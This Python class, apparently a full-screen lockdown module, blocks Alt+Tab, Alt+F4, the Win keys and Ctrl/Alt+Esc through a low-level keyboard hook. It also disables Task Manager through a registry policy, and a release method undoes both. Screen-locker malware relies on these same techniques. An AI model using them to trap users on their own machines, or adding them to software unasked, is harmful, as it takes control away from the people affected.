import ctypes
import platform
from ctypes import wintypes


class SystemSecurity:
    def __init__(self, root):
        self.root = root
        if platform.system() == "Windows":
            self.user32 = ctypes.windll.user32
            self.kernel32 = ctypes.windll.kernel32
            self.setup_hooks()
            self.block_task_manager()
        else:
            self.user32 = None

    def setup_hooks(self):

        class KBDLLHOOKSTRUCT(ctypes.Structure):
            _fields_ = [
                ("vkCode", wintypes.DWORD),
                ("scanCode", wintypes.DWORD),
                ("flags", wintypes.DWORD),
                ("time", wintypes.DWORD),
                ("dwExtraInfo", ctypes.POINTER(wintypes.ULONG))
            ]

        HOOKPROC = ctypes.WINFUNCTYPE(
            ctypes.c_int,
            ctypes.c_int,
            ctypes.c_int,
            ctypes.POINTER(KBDLLHOOKSTRUCT)
        )

        def keyboard_callback(nCode, wParam, lParam):
            if nCode >= 0:
                kbd = lParam.contents
                vk_code = kbd.vkCode

                # Блокируемые клавиши:
                # Alt+Tab, Win+Tab, Alt+F4, Ctrl+Esc, Win, Alt+Esc
                blocked_keys = {
                    0x09: self.user32.GetAsyncKeyState(0x12) & 0x8000,  # Tab + Alt
                    0x73: self.user32.GetAsyncKeyState(0x12) & 0x8000,  # F4 + Alt
                    0x1B: (self.user32.GetAsyncKeyState(0x11) | self.user32.GetAsyncKeyState(0x12)) & 0x8000,
                    # Esc + Ctrl/Alt
                    0x5B: True,  # Win
                    0x5C: True  # Win (правая)
                }

                if vk_code in blocked_keys and blocked_keys[vk_code]:
                    return 1  # Блокируем
            return self.user32.CallNextHookEx(None, nCode, wParam, ctypes.byref(lParam.contents))

        self.keyboard_hook = HOOKPROC(keyboard_callback)
        self.hook_id = self.user32.SetWindowsHookExA(
            13,  # WH_KEYBOARD_LL
            self.keyboard_hook,
            None,
            0
        )

    def block_task_manager(self):
        try:
            import winreg
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
                0,
                winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
        except Exception as e:
            print(f"Не удалось заблокировать Диспетчер задач: {e}")

    def disable_window_controls(self):
        self.root.overrideredirect(True)
        self.root.geometry(f"{self.root.winfo_screenwidth()}x{self.root.winfo_screenheight()}+0+0")

        self.root.bind("<Alt-F4>", lambda e: "break")
        self.root.bind("<Control-Alt-Delete>", lambda e: "break")

    def release_hooks(self):
        if hasattr(self, 'hook_id') and self.hook_id:
            self.user32.UnhookWindowsHookEx(self.hook_id)
        try:
            import winreg
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
                0,
                winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)
        except:
            pass